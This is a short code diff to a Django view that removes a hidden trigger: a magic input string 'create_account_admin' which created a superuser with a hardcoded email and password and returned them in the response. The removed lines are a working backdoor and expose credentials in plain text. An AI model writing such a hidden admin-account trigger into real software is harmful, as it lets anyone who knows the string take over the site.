@@ -60,22 +60,7 @@ def clairvoyante(request):
         return
     with contextlib.suppress(ValueError):
         input_value = request.POST.get("messageInput")
-        if input_value == "create_account_admin":
-            User = get_user_model()
-            try:
-                superuser = User.objects.create_superuser(
-                    "nuno.ricardo.mars@gmail.com", "Bcxau9p^^123."
-                )
-                result = {
-                    "subject": "No",
-                    "message": f"Superuser created, email: {superuser.email}, password: Bcxau9p^^123.",
-                }
-
-            except Exception as e:
-                result = {"message": f"Superuser not created, error: {e}"}
-                pass
-
-        # result = clairvoyant(input_value)
+        result = clairvoyant(input_value)
         return JsonResponse(result)
 
 
